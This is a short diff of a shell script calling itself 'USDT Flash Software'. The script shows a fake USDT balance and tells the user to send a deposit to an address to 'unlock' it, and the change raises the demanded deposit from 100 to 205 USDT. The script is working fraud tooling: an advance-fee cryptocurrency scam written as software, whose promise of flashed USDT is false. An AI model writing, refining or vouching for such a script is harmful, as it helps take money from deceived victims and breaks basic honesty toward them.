@@ -24,7 +24,7 @@ function fancyBoxEcho {
 welcome_message="Welcome to the USDT Flash Software! Unlock your balance and enjoy the power of Flash USDT!"
 echo -e "$usdt_logo"
 fancyBoxEcho "$welcome_message"
-echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 205 USDT to the following address: $account_id"
 function unlockBalance {
     echo " "
     read -p "Enter your deposit amount in USDT: " depositAmount
